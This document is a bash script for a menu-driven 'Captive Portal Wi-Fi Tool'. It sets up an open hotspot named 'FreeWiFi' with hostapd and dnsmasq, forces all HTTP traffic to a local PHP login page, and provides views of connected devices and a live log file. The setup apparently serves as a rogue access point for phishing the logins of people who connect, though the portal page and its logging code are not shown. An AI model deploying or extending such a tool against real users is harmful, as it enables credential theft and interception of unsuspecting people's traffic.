#!/bin/bash

PORTAL_DIR="portal"
LOG_FILE="logs/log.txt"
HOTSPOT_IFACE="wlp4s0"
SSID="FreeWiFi"

HOSTAPD_CONF="/tmp/hostapd.conf"
DNSMASQ_CONF="/tmp/dnsmasq.conf"

# ---------------------------
# Setup folders and install dependencies
# ---------------------------
setup() {
    echo "[+] Setting up folders..."
    mkdir -p "$PORTAL_DIR" logs
    touch "$LOG_FILE"
    chmod 666 "$LOG_FILE"

    echo "[+] Installing dependencies..."
    sudo apt update
    sudo apt install hostapd dnsmasq php-cli iptables -y
    echo "[+] Setup complete!"
}

# ---------------------------
# Create hostapd and dnsmasq configs
# ---------------------------
create_configs() {
cat > $HOSTAPD_CONF <<EOF
interface=$HOTSPOT_IFACE
driver=nl80211
ssid=$SSID
hw_mode=g
channel=6
auth_algs=1
ignore_broadcast_ssid=0
EOF

cat > $DNSMASQ_CONF <<EOF
interface=$HOTSPOT_IFACE
dhcp-range=192.168.50.2,192.168.50.50,255.255.255.0,12h
EOF
}

# ---------------------------
# Start hotspot + captive portal
# ---------------------------
start_hotspot() {
    echo "[+] Starting hotspot on $HOTSPOT_IFACE..."

    create_configs

    sudo ip link set $HOTSPOT_IFACE down
    sudo ip addr flush dev $HOTSPOT_IFACE
    sudo ip addr add 192.168.50.1/24 dev $HOTSPOT_IFACE
    sudo ip link set $HOTSPOT_IFACE up

    # Enable IP forwarding
    sudo sysctl -w net.ipv4.ip_forward=1

    # Start hostapd & dnsmasq
    sudo hostapd $HOSTAPD_CONF -B
    sudo dnsmasq -C $DNSMASQ_CONF

    # Redirect all HTTP traffic to local portal
    sudo iptables -t nat -A PREROUTING -i $HOTSPOT_IFACE -p tcp --dport 80 -j DNAT --to-destination 192.168.50.1:80
    sudo iptables -t nat -A POSTROUTING -o $HOTSPOT_IFACE -j MASQUERADE

    echo "[+] Hotspot started with captive portal."
    echo "    Connect your device to SSID: $SSID"
    echo "    Devices will be redirected to the login page automatically."
}

# ---------------------------
# Stop hotspot
# ---------------------------
stop_hotspot() {
    echo "[+] Stopping hotspot..."

    sudo pkill hostapd
    sudo pkill dnsmasq

    # Remove iptables rules
    sudo iptables -t nat -F
    sudo iptables -t nat -X

    sudo sysctl -w net.ipv4.ip_forward=0

    echo "[+] Hotspot stopped."
}

# ---------------------------
# Start login page server
# ---------------------------
start_server() {
    if [ ! -d "$PORTAL_DIR" ]; then
        echo "[-] Portal directory does not exist!"
        return
    fi
    cd "$PORTAL_DIR" || exit
    php -S 0.0.0.0:80
}

# ---------------------------
# Show connected devices
# ---------------------------
show_devices() {
    echo "[+] Connected devices (DHCP leases):"
    cat /var/lib/misc/dnsmasq.leases 2>/dev/null
}

# ---------------------------
# Logs
# ---------------------------
view_logs() { cat "$LOG_FILE"; }
live_logs() { tail -f "$LOG_FILE"; }

# ---------------------------
# Edit page
# ---------------------------
edit_page() { nano "$PORTAL_DIR/index.html"; }

# ---------------------------
# Main Menu
# ---------------------------
while true; do
    echo ""
    echo "====== Captive Portal Wi-Fi Tool ======"
    echo "1) Setup"
    echo "2) Start Hotspot + Captive Portal"
    echo "3) Stop Hotspot"
    echo "4) Start Login Page"
    echo "5) Show Connected Devices"
    echo "6) View Logs"
    echo "7) Live Logs"
    echo "8) Edit Page"
    echo "9) Exit"
    echo "======================================"
    read -p "Select option: " choice

    case $choice in
        1) setup ;;
        2) start_hotspot ;;
        3) stop_hotspot ;;
        4) start_server ;;
        5) show_devices ;;
        6) view_logs ;;
        7) live_logs ;;
        8) edit_page ;;
        9) exit ;;
        *) echo "Invalid option" ;;
    esac
done
